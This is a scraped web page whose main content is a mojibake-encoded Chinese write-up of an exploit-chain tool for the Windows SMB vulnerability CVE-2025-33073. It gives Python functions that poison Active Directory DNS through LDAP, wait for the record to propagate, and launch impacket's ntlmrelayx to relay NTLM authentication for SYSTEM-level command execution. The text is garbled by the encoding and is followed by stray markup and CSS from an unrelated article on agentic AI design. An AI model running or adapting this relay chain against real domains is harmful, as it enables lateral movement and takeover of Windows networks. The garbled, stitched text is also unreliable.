<p>æœ¬é¡¹ç›®æ˜¯é’ˆå¯¹Windows SMBå®¢æˆ·ç«¯æ¼æ´CVE-2025-33073çš„åˆ©ç”¨é“¾ç ”ç©¶å·¥å…·ã€‚è¯¥æ¼æ´æ˜¯ä¸€ä¸ªé«˜ä¸¥é‡æ€§çš„èº«ä»½éªŒè¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVSS 8.8ï¼‰ï¼Œå…è®¸æ”»å‡»è€…åœ¨æœªå¯ç”¨SMBç­¾åçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡NTLMä¸­ç»§æ”»å‡»è·å¾—SYSTEMçº§åˆ«çš„ä»£ç æ‰§è¡Œæƒé™ã€‚æœ¬å·¥å…·ç»“åˆäº†ADIDNSï¼ˆActive Directoryé›†æˆDNSï¼‰æŠ•æ¯’æŠ€æœ¯ï¼Œè‡ªåŠ¨åŒ–å®ŒæˆDNSè®°å½•æ³¨å…¥ã€ç­‰å¾…ä¼ æ’­å’Œè§¦å‘SMB NTLMä¸­ç»§çš„å®Œæ•´æ”»å‡»æµç¨‹ï¼Œç”¨äºæ¼”ç¤ºå’Œç ”ç©¶WindowsåŸŸç¯å¢ƒä¸­çš„æ¨ªå‘ç§»åŠ¨é£é™©ã€‚</p>
<h3 data-id="heading-2">åŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>è‡ªåŠ¨åŒ–æ”»å‡»é“¾</strong>ï¼šæ•´åˆdnstool.pyä¸impacket-ntlmrelayxï¼Œå®ç°ä¸€é”®åŒ–æ”»å‡»æµç¨‹</li>
<li><strong>ADIDNSæŠ•æ¯’</strong>ï¼šé€šè¿‡LDAPåè®®å‘Active Directoryæ·»åŠ æ¶æ„DNSè®°å½•</li>
<li><strong>æ™ºèƒ½ç­‰å¾…æœºåˆ¶</strong>ï¼šè‡ªåŠ¨ç›‘æ§DNSè®°å½•ä¼ æ’­çŠ¶æ€ï¼Œç¡®ä¿æŠ•æ¯’æˆåŠŸ</li>
<li><strong>çµæ´»çš„NTLMä¸­ç»§å¯åŠ¨</strong>ï¼šæ”¯æŒåœ¨å½“å‰ç»ˆç«¯æˆ–æ–°å»ºxtermçª—å£ä¸­å¯åŠ¨ntlmrelayxç›‘å¬å™¨</li>
<li><strong>æ”¯æŒè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œ</strong>ï¼šå¯åœ¨ä¸­ç»§æˆåŠŸæ—¶æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤</li>
<li><strong>SOCKSä»£ç†æ”¯æŒ</strong>ï¼šå¯é€‰å¼€å¯SOCKSä»£ç†è¿›è¡Œè¿›ä¸€æ­¥çš„ç½‘ç»œæ¸—é€</li>
</ul>
<h3 data-id="heading-3">å®‰è£…æŒ‡å—</h3>
<h4 data-id="heading-4">ç³»ç»Ÿè¦æ±‚</h4>
<ul>
<li>Python 3.x</li>
<li>ç±»Unixæ“ä½œç³»ç»Ÿï¼ˆæ”¯æŒxtermç»ˆç«¯ï¼‰</li>
<li>ç½‘ç»œè®¿é—®æƒé™ï¼ˆå¯è®¿é—®ç›®æ ‡åŸŸæ§DNSæœåŠ¡å™¨ï¼‰</li>
</ul>
<h4 data-id="heading-5">ä¾èµ–å®‰è£…</h4>
<p>é¡¹ç›®ä¾èµ–äºä»¥ä¸‹Pythonåº“ï¼Œå¯é€šè¿‡pipå®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install impacket ldap3 dnspython
</code></pre>
<h4 data-id="heading-6">å·¥å…·ä¾èµ–</h4>
<p>ç¡®ä¿ç³»ç»Ÿä¸­å·²å®‰è£…ä»¥ä¸‹å®‰å…¨å·¥å…·ï¼š</p>
<ul>
<li><strong>impacketå¥—ä»¶</strong>ï¼šç‰¹åˆ«æ˜¯<code>ntlmrelayx</code>å·¥å…·</li>
<li><strong>digå‘½ä»¤</strong>ï¼šç”¨äºDNSæŸ¥è¯¢æµ‹è¯•ï¼ˆé€šå¸¸åŒ…å«åœ¨<code>dnsutils</code>åŒ…ä¸­ï¼‰</li>
<li><strong>xtermç»ˆç«¯</strong>ï¼šå¯é€‰ï¼Œç”¨äºåœ¨æ–°çª—å£ä¸­è¿è¡Œç›‘å¬å™¨</li>
</ul>
<h4 data-id="heading-7">é…ç½®è¯´æ˜</h4>
<p>æ— éœ€é¢å¤–é…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰å‚æ•°é€šè¿‡å‘½ä»¤è¡Œä¼ é€’ã€‚</p>
<h3 data-id="heading-8">ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-9">åŸºæœ¬ç”¨æ³•</h4>
<p>è¯¥å·¥å…·æ˜¯ä¸€ä¸ªPythonè„šæœ¬ï¼Œéœ€è¦æä¾›åŸŸç”¨æˆ·å‡­æ®ã€æ”»å‡»è€…IPã€DNSæœåŠ¡å™¨IPå’ŒåŸŸæ§FQDNç­‰ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¤ºä¾‹ï¼šæ‰§è¡Œå®Œæ•´çš„æ”»å‡»é“¾</span>
./exploit_chain.py -u domain_user -p password -a attacker_ip -d dns_server_ip -dc dc.domain.com -t target_machine
</code></pre>
<h4 data-id="heading-10">å‚æ•°è¯¦è§£</h4>
<ul>
<li><code>-u, --user</code>ï¼šåŸŸç”¨æˆ·åï¼ˆæ ¼å¼ï¼šDOMAIN\User æˆ– Userï¼‰</li>
<li><code>-p, --password</code>ï¼šç”¨æˆ·å¯†ç </li>
<li><code>-a, --attacker-ip</code>ï¼šæ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€ï¼ˆç”¨äºDNSè®°å½•æŒ‡å‘ï¼‰</li>
<li><code>-d, --dns-ip</code>ï¼šç›®æ ‡åŸŸDNSæœåŠ¡å™¨IPåœ°å€</li>
<li><code>-dc, --dc-fqdn</code>ï¼šåŸŸæ§åˆ¶å™¨çš„å®Œå…¨é™å®šåŸŸå</li>
<li><code>-t, --target</code>ï¼šSMBä¸­ç»§çš„ç›®æ ‡æœºå™¨IPæˆ–ä¸»æœºå</li>
<li><code>--timeout</code>ï¼šç­‰å¾…DNSä¼ æ’­çš„è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œé»˜è®¤60ï¼‰</li>
<li><code>--cli-only</code>ï¼šä»…åœ¨å½“å‰å‘½ä»¤è¡Œå¯åŠ¨ntlmrelayxï¼Œä¸å¼€æ–°çª—å£</li>
<li><code>-c, --command</code>ï¼šä¸­ç»§æˆåŠŸæ—¶æ‰§è¡Œçš„è‡ªå®šä¹‰ç³»ç»Ÿå‘½ä»¤</li>
<li><code>--socks</code>ï¼šå¯ç”¨SOCKSä»£ç†æ¨¡å¼</li>
</ul>
<h4 data-id="heading-11">å…¸å‹æ”»å‡»åœºæ™¯</h4>
<ol>
<li><strong>å†…éƒ¨ç½‘ç»œæ¨ªå‘ç§»åŠ¨</strong>ï¼šåœ¨å·²è·å¾—ä¸€ä¸ªåŸŸç”¨æˆ·å‡­æ®çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤å·¥å…·å‘ADIDNSæ³¨å…¥æŒ‡å‘å…¶æ§åˆ¶æœåŠ¡å™¨çš„DNSè®°å½•ï¼Œç„¶åè¯±å¯¼ç›®æ ‡ä¸»æœºå‘èµ·SMBè¿æ¥ï¼Œé€šè¿‡NTLMä¸­ç»§è·å¾—æ›´é«˜æƒé™ã€‚</li>
<li><strong>æƒé™æå‡</strong>ï¼šç»“åˆå…¶ä»–æ¼æ´æˆ–ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œè§¦å‘åŸŸå†…ä¸»æœºå‘æ¶æ„DNSè®°å½•æŒ‡å‘çš„æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œä¸­ç»§è¯¥èº«ä»½éªŒè¯åˆ°åŸŸæ§åˆ¶å™¨æˆ–å…¶ä»–é«˜ä»·å€¼ç›®æ ‡ã€‚</li>
</ol>
<h3 data-id="heading-12">æ ¸å¿ƒä»£ç </h3>
<h4 data-id="heading-13">1. DNSè®°å½•æ·»åŠ å‡½æ•°</h4>
<p>æ­¤å‡½æ•°è°ƒç”¨å¤–éƒ¨çš„<code>dnstool.py</code>è„šæœ¬ï¼Œé€šè¿‡LDAPå‘Active Directoryæ·»åŠ ä¸€æ¡é™æ€çš„æ¶æ„DNSè®°å½•ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_dnstool</span>(<span class="hljs-params">user, password, attacker_ip, dns_ip, dc_fqdn</span>):
    <span class="hljs-string">"""
    ä½¿ç”¨dnstool.pyæ·»åŠ æ¶æ„DNSè®°å½•åˆ°ADIDNSã€‚
    
    å‚æ•°:
        user: å…·æœ‰å†™å…¥ADIDNSæƒé™çš„åŸŸç”¨æˆ·
        password: å¯¹åº”ç”¨æˆ·çš„å¯†ç 
        attacker_ip: æ”»å‡»è€…æœåŠ¡å™¨IPï¼ŒDNSè®°å½•å°†æŒ‡å‘æ­¤åœ°å€
        dns_ip: ç›®æ ‡åŸŸDNSæœåŠ¡å™¨IP
        dc_fqdn: åŸŸæ§åˆ¶å™¨çš„FQDN
    """</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Adding malicious DNS record using dnstool.py..."</span>)
    dnstool_cmd = [
        <span class="hljs-string">"python3"</span>, <span class="hljs-string">"dnstool.py"</span>,
        <span class="hljs-string">"-u"</span>, user,
        <span class="hljs-string">"-p"</span>, password,
        <span class="hljs-string">"-a"</span>, <span class="hljs-string">"add"</span>,
        <span class="hljs-string">"-r"</span>, STATIC_DNS_RECORD,  <span class="hljs-comment"># é¢„å®šä¹‰çš„DNSè®°å½•å</span>
        <span class="hljs-string">"-d"</span>, attacker_ip,
        <span class="hljs-string">"-dns-ip"</span>, dns_ip,
        dc_fqdn
    ]
    subprocess.run(dnstool_cmd, check=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># æ‰§è¡Œdnstoolå‘½ä»¤</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] DNS record added."</span>)
</code></pre>
<h4 data-id="heading-14">2. DNSä¼ æ’­ç­‰å¾…å‡½æ•°</h4>
<p>è¯¥å‡½æ•°å¾ªç¯æŸ¥è¯¢DNSæœåŠ¡å™¨ï¼Œç¡®è®¤æ³¨å…¥çš„æ¶æ„è®°å½•å·²æˆåŠŸä¼ æ’­å¹¶ç”Ÿæ•ˆã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wait_for_dns_record</span>(<span class="hljs-params">record, dns_ip, timeout=<span class="hljs-number">60</span></span>):
    <span class="hljs-string">"""
    ç­‰å¾…æŒ‡å®šçš„DNSè®°å½•åœ¨ç›®æ ‡DNSæœåŠ¡å™¨ä¸Šç”Ÿæ•ˆã€‚
    
    å‚æ•°:
        record: è¦æŸ¥è¯¢çš„DNSè®°å½•åç§°
        dns_ip: ç›®æ ‡DNSæœåŠ¡å™¨IP
        timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    
    è¿”å›:
        bool: æˆåŠŸè§£æåˆ°è®°å½•è¿”å›Trueï¼Œå¦åˆ™è¿”å›False
    """</span>
    timeout = <span class="hljs-built_in">int</span>(timeout)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Waiting for DNS record <span class="hljs-subst">{record}</span> to propagate..."</span>)
    start_time = time.time()
    <span class="hljs-keyword">while</span> time.time() - start_time &lt; timeout:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ä½¿ç”¨digå‘½ä»¤æŸ¥è¯¢DNSè®°å½•</span>
            result = subprocess.run(
                [<span class="hljs-string">"dig"</span>, <span class="hljs-string">"+short"</span>, record, <span class="hljs-string">f"@<span class="hljs-subst">{dns_ip}</span>"</span>],
                capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>
            )
            <span class="hljs-keyword">if</span> result.stdout.strip():  <span class="hljs-comment"># å¦‚æœæŸ¥è¯¢ç»“æœéç©º</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] DNS record is live."</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[!] Error checking DNS record: <span class="hljs-subst">{e}</span>"</span>)
        time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[!] Timeout reached. DNS record not found."</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h4 data-id="heading-15">3. NTLMä¸­ç»§å¯åŠ¨å‡½æ•°</h4>
<p>æ ¹æ®ç”¨æˆ·é€‰æ‹©ï¼Œåœ¨å½“å‰ç»ˆç«¯æˆ–æ–°å»ºçš„xtermçª—å£ä¸­å¯åŠ¨impacketçš„ntlmrelayxç›‘å¬å™¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_ntlmrelayx</span>(<span class="hljs-params">target, cli_only=<span class="hljs-literal">False</span>, custom_command=<span class="hljs-literal">None</span>, socks=<span class="hljs-literal">False</span></span>):
    <span class="hljs-string">"""
    å¯åŠ¨impacket-ntlmrelayxè¿›è¡ŒSMB NTLMä¸­ç»§ç›‘å¬ã€‚
    
    å‚æ•°:
        target: ä¸­ç»§ç›®æ ‡ï¼ˆå¦‚åŸŸæ§åˆ¶å™¨ï¼‰
        cli_only: ä¸ºTrueåˆ™åœ¨å½“å‰ç»ˆç«¯å¯åŠ¨ï¼Œå¦åˆ™å¼€æ–°xtermçª—å£
        custom_command: ä¸­ç»§æˆåŠŸåæ‰§è¡Œçš„å‘½ä»¤
        socks: æ˜¯å¦å¯ç”¨SOCKSä»£ç†æ¨¡å¼
    """</span>
    <span class="hljs-keyword">if</span> cli_only:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Starting ntlmrelayx listener in this terminal..."</span>)
        <span class="hljs-comment"># æ„å»ºåŸºæœ¬å‘½ä»¤</span>
        <span class="hljs-keyword">if</span> custom_command:
            cmd = [<span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>, <span class="hljs-string">"-c"</span>, custom_command]
        <span class="hljs-keyword">else</span>:
            cmd = [<span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>]
        <span class="hljs-keyword">if</span> socks:
            cmd.append(<span class="hljs-string">"-socks"</span>)  <span class="hljs-comment"># æ·»åŠ SOCKSä»£ç†é€‰é¡¹</span>
        <span class="hljs-keyword">return</span> subprocess.Popen(cmd)  <span class="hljs-comment"># å¯åŠ¨å­è¿›ç¨‹</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Starting ntlmrelayx listener in a new xterm..."</span>)
        <span class="hljs-comment"># åœ¨xtermä¸­å¯åŠ¨ï¼Œä¿æŒçª—å£æ‰“å¼€</span>
        <span class="hljs-keyword">if</span> custom_command:
            cmd = [<span class="hljs-string">"xterm"</span>, <span class="hljs-string">"-hold"</span>, <span class="hljs-string">"-e"</span>, <span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>, <span class="hljs-string">"-c"</span>, custom_command]
        <span class="hljs-keyword">else</span>:
            cmd = [<span class="hljs-string">"xterm"</span>, <span class="hljs-string">"-hold"</span>, <span class="hljs-string">"-e"</span>, <span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>]
        <span class="hljs-keyword">if</span> socks:
            cmd.insert(-<span class="hljs-number">1</span>, <span class="hljs-string">"-socks"</span>)  <span class="hljs-comment"># åœ¨å‘½ä»¤æœ«å°¾å‰æ’å…¥SOCKSé€‰é¡¹</span>
        <span class="hljs-keyword">return</span> subprocess.Popen(cmd)
</code></pre>
<h4 data-id="heading-16">4. ADIDNSå·¥å…·æ ¸å¿ƒäº¤äº’ä»£ç ï¼ˆèŠ‚é€‰è‡ªdnstool.pyï¼‰</h4>
<p>æ­¤éƒ¨åˆ†ä»£ç å±•ç¤ºäº†å¦‚ä½•é€šè¿‡LDAPåè®®ä¸Active Directory DNSåŒºåŸŸè¿›è¡Œäº¤äº’ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_dns_record</span>(<span class="hljs-params">connection, record_name, record_data, dnsserver</span>):
    <span class="hljs-string">"""
    é€šè¿‡LDAPå‘ADIDNSæ·»åŠ ä¸€æ¡DNSè®°å½•ã€‚
    
    å‚æ•°:
        connection: å·²å»ºç«‹çš„LDAPè¿æ¥
        record_name: è¦æ·»åŠ çš„è®°å½•åç§°
        record_data: è®°å½•æ•°æ®ï¼ˆå¦‚IPåœ°å€ï¼‰
        dnsserver: DNSæœåŠ¡å™¨å¯¹è±¡
    """</span>
    <span class="hljs-comment"># æ„å»ºDNSèŠ‚ç‚¹çš„å¯åˆ†è¾¨åç§°ï¼ˆDNï¼‰</span>
    dnsroot = dnsserver.get_dns_root()
    container = <span class="hljs-string">'DC='</span> + record_name + <span class="hljs-string">','</span> + dnsroot
    
    <span class="hljs-comment"># åˆ›å»ºdnsNodeå¯¹è±¡å¹¶è®¾ç½®å±æ€§</span>
    dns_record = ldaptypes.DNS_RECORD()
    dns_record[<span class="hljs-string">'Data'</span>] = record_data
    dns_record[<span class="hljs-string">'Type'</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># Aè®°å½•ç±»å‹</span>
    
    <span class="hljs-comment"># å‡†å¤‡è¦æ·»åŠ çš„å±æ€§</span>
    attributes = {
        <span class="hljs-string">'objectClass'</span>: [<span class="hljs-string">'top'</span>, <span class="hljs-string">'dnsNode'</span>],
        <span class="hljs-string">'dnsRecord'</span>: [dns_record.getData()],
        <span class="hljs-string">'dNSTombstoned'</span>: <span class="hljs-literal">False</span>
    }
    
    <span class="hljs-comment"># æ‰§è¡ŒLDAPæ·»åŠ æ“ä½œ</span>
    connection.add(container, attributes=attributes)
    print_o(<span class="hljs-string">f"Successfully added record <span class="hljs-subst">{record_name}</span>"</span>)
</code></pre>
<h4 data-id="heading-17">æ¼æ´å…³é”®ä¿¡æ¯ï¼ˆCVE-2025-33073ï¼‰</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## æ¼æ´è¯¦æƒ…</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**CVE ID**</span>: CVE-2025-33073
<span class="hljs-bullet">-</span> <span class="hljs-strong">**CVSSè¯„åˆ†**</span>: 8.8 (High)
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å½±å“èŒƒå›´**</span>: Windows 10, 11, Server 2012â€“2025
<span class="hljs-bullet">-</span> <span class="hljs-strong">**æ”»å‡»å‘é‡**</span>: ç½‘ç»œï¼ˆéœ€èº«ä»½éªŒè¯ï¼‰
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å½±å“**</span>: SYSTEMçº§åˆ«ä»£ç æ‰§è¡Œ
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å…³é”®ç‰¹æ€§**</span>: ç»•è¿‡NTLMåå°„ç¼“è§£æªæ–½
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šæœ¬å·¥å…·ä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•ã€æ•™è‚²å’Œç ”ç©¶ç›®çš„ã€‚æœªç»æˆæƒå¯¹ä»–äººç³»ç»Ÿè¿›è¡Œæµ‹è¯•æ˜¯éæ³•çš„ã€‚
6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAOCkEtiS8C/LxH9i/qwckdE</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡]]></title>    <link>https://juejin.cn/post/7592524811860525090</link>    <guid>https://juejin.cn/post/7592524811860525090</guid>    <pubDate>2026-01-08T01:58:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592524811860525090" data-draft-id="7592483877986648070" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡"/> <meta itemprop="keywords" content="Agent,AIç¼–ç¨‹,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T01:58:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FreeCode"/> <meta itemprop="url" content="https://juejin.cn/user/1282499717900794"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1282499717900794/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FreeCode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:58:31.000Z" title="Thu Jan 08 2026 01:58:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs 